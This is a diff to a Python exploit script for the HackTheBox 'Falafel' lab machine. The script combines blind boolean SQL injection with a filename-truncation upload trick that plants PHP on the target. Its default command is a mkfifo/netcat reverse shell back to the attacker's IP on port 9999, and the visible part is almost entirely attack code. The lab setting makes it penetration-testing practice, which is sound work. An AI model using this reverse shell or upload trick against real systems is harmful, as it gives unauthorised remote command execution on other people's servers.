@@ -5,10 +5,12 @@ import urllib.parse
 
 parser = argparse.ArgumentParser(description='Blind SQL Injection Boolean (Falafel hackthebox)')
 
-parser.add_argument("--targetI", default='http://10.10.10.73/', type=str,
+parser.add_argument("--targetIp", default='10.10.10.73', type=str,
                     help="target of falafel box")
-parser.add_argument("--localIp", default='http://10.10.14.24/', type=str,
+parser.add_argument("--localIp", default='10.10.14.24', type=str,
                     help="your htb ip")
+parser.add_argument("--localPort", default='8000', type=str,
+                    help="your port to open")
 parser.add_argument("--command",
                     default='rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.24 9999 >/tmp/f', type=str,
                     help="Command to execute on Falafel")
@@ -108,7 +110,8 @@ def main():
         exit(0)
 
     response = session_admin.post("http://" + args.targetIp + "/upload.php",
-                                  data={"url": "http://" + args.localIp + ":8000/" + "A" * 232 + ".php.jpg"})
+                                  data={
+                                      "url": "http://" + args.localIp + ":" + args.localPort + "/" + "A" * 232 + ".php.jpg"})
 
     result = [line for line in response.text.split('\n') if "New name is" in line]
     print("File saved under extention: " + result[0].split('.')[1])
